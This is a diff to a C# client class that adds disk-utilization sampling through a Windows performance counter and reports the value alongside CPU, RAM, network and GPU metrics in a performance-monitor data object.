@@ -1207,9 +1207,11 @@ internal class TlsClient : IDisposable
     private bool _netPrimed;
     private System.Net.NetworkInformation.NetworkInterface[]? _netIfCache;
     private DateTime _netIfRefreshAt = DateTime.MinValue;
-    private IntPtr _diskQuery = IntPtr.Zero;
-    private IntPtr _diskCtrR  = IntPtr.Zero;
-    private IntPtr _diskCtrW  = IntPtr.Zero;
+    private IntPtr _diskQuery   = IntPtr.Zero;
+    private IntPtr _diskCtrR    = IntPtr.Zero;
+    private IntPtr _diskCtrW    = IntPtr.Zero;
+    private IntPtr _diskPctQuery = IntPtr.Zero;
+    private IntPtr _diskPctCtr   = IntPtr.Zero;
     // NtQuery fallback fields (used when PDH counters fail)
     private long _diskNtLastRead  = -1;
     private long _diskNtLastWrite = -1;
@@ -1319,6 +1321,39 @@ internal class TlsClient : IDisposable
         catch { return (0, 0); }
     }
 
+    // Disk utilization % via PDH counter \PhysicalDisk(_Total)\% Disk Time
+    private float SampleDiskPct()
+    {
+        try
+        {
+            const uint PDH_FMT_DOUBLE = 0x200;
+            if (_diskPctQuery == IntPtr.Zero)
+            {
+                if (PdhOpenQuery(IntPtr.Zero, IntPtr.Zero, out _diskPctQuery) != 0) { _diskPctQuery = IntPtr.Zero; return -1f; }
+                if (PdhAddEnglishCounterW(_diskPctQuery, @"\PhysicalDisk(_Total)\% Disk Time", IntPtr.Zero, out _diskPctCtr) != 0)
+                { PdhCloseQuery(_diskPctQuery); _diskPctQuery = IntPtr.Zero; return -1f; }
+                PdhCollectQueryData(_diskPctQuery);
+                return 0f;
+            }
+            if (PdhCollectQueryData(_diskPctQuery) != 0) return 0f;
+            int sz = 0;
+            PdhGetFormattedCounterArrayW(_diskPctCtr, PDH_FMT_DOUBLE, ref sz, out _, IntPtr.Zero);
+            if (sz <= 0) return 0f;
+            var buf = System.Runtime.InteropServices.Marshal.AllocHGlobal(sz);
+            try
+            {
+                if (PdhGetFormattedCounterArrayW(_diskPctCtr, PDH_FMT_DOUBLE, ref sz, out int cnt, buf) == 0 && cnt > 0)
+                {
+                    double v = BitConverter.Int64BitsToDouble(System.Runtime.InteropServices.Marshal.ReadInt64(buf, 16));
+                    return (float)Math.Min(100.0, Math.Max(0.0, v));
+                }
+            }
+            finally { System.Runtime.InteropServices.Marshal.FreeHGlobal(buf); }
+            return 0f;
+        }
+        catch { _diskPctQuery = IntPtr.Zero; return -1f; }
+    }
+
     // GPU utilization via PDH counter \GPU Engine(*engtype_3D)\Utilization Percentage
     // Returns 0-100 (sum of all 3D engine instances, clamped), or -1 if unavailable.
     private IntPtr _gpuQuery  = IntPtr.Zero;
@@ -1383,6 +1418,7 @@ internal class TlsClient : IDisposable
                 var hw  = SampleHardware(cpu);
                 var (sent, recv)   = SampleNetwork();
                 var (diskR, diskW) = SampleDisk();
+                var diskPct = SampleDiskPct();
                 var gpuPct = SampleGpuPct();
                 _perfMonStub.CpuUsage      = hw.CpuUsage;
                 _perfMonStub.RamUsed       = hw.RamUsed;
@@ -1391,6 +1427,7 @@ internal class TlsClient : IDisposable
                 _perfMonStub.NetworkRecvKB = recv;
                 _perfMonStub.DiskReadKBps  = diskR;
                 _perfMonStub.DiskWriteKBps = diskW;
+                _perfMonStub.DiskUsagePct  = diskPct;
                 _perfMonStub.CpuName       = hw.CpuName;
                 _perfMonStub.GpuName       = hw.GpuName;
                 _perfMonStub.GpuUsage      = gpuPct;
@@ -2255,7 +2292,8 @@ internal class TlsClient : IDisposable
         _frameCh.Writer.TryComplete();
         _ctrlOutCh.Writer.TryComplete();
         _frameOutCh.Writer.TryComplete();
-        if (_diskQuery != IntPtr.Zero) { PdhCloseQuery(_diskQuery); _diskQuery = IntPtr.Zero; }
+        if (_diskQuery    != IntPtr.Zero) { PdhCloseQuery(_diskQuery);    _diskQuery    = IntPtr.Zero; }
+        if (_diskPctQuery != IntPtr.Zero) { PdhCloseQuery(_diskPctQuery); _diskPctQuery = IntPtr.Zero; }
         if (_gpuQuery  != IntPtr.Zero) { PdhCloseQuery(_gpuQuery);  _gpuQuery  = IntPtr.Zero; }
         if (_gpuBuf    != IntPtr.Zero) { System.Runtime.InteropServices.Marshal.FreeHGlobal(_gpuBuf); _gpuBuf = IntPtr.Zero; }
     }
@@ -2744,7 +2782,7 @@ internal class CdpSignupResultStub  { public bool Success { get; set; } public s
 // ── Hardware Stats + PerfMon ─────────────────────────
 internal class HardwareStatsStub { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; public int IdleSeconds { get; set; } }
 internal class PerfMonStartStub  { public int IntervalMs { get; set; } = 1000; }
-internal class PerfMonDataStub   { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public long NetworkSentKB { get; set; } public long NetworkRecvKB { get; set; } public long DiskReadKBps { get; set; } public long DiskWriteKBps { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; public float GpuUsage { get; set; } = -1f; }
+internal class PerfMonDataStub   { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public long NetworkSentKB { get; set; } public long NetworkRecvKB { get; set; } public long DiskReadKBps { get; set; } public long DiskWriteKBps { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; public float GpuUsage { get; set; } = -1f; public float DiskUsagePct { get; set; } = -1f; }
 
 // ── Process Manager extended ──────────────────────────
 internal class ProcSuspendResumeStub { public int Pid { get; set; } }
